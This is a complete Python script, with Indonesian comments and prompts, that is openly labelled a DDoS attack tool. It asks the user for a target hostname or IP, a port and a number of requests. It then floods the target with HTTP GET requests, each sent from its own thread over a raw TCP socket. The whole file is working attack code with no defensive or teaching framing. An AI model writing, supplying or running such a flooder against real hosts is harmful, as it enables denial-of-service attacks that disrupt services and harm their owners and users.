#!/usr/bin/python3
⠀⠀⠀⠀⠀⠀⠀
import socket
import threading

def kirim_permintaan_get(target_host, target_port, nomor_paket):
    try:
        # Membuat socket TCP
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Menghubungkan socket ke target host dan port
        client_socket.connect((target_host, target_port))

        # Membuat permintaan HTTP GET
        request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
        
        # Mengirim permintaan ke server
        client_socket.send(request.encode())

        # Menerima respons dari server (maksimum 4096 byte)
        response = client_socket.recv(4096)
        
        # Menutup koneksi socket
        client_socket.close()
      
    except Exception as e:
        # Menampilkan pesan kesalahan jika terjadi masalah
        print(f"Error: {str(e)}")

def serangan_ddos(target_host, target_port, jumlah_permintaan):
    # Melakukan serangan DDoS dengan mengirim sejumlah permintaan GET secara bersamaan
    for i in range(1, jumlah_permintaan + 1):
        # Membuat thread untuk setiap permintaan GET
        thread = threading.Thread(target=kirim_permintaan_get, args=(target_host, target_port, i))
        thread.start()

if __name__ == "__main__":
    # Meminta input dari pengguna
    target_host = input("Masukkan hostname atau IP target: ")
    target_port = int(input("Masukkan port target: "))
    jumlah_permintaan = int(input("Masukkan jumlah permintaan yang akan dikirim: "))

    # Memulai serangan DDoS
    serangan_ddos(target_host, target_port, jumlah_permintaan)
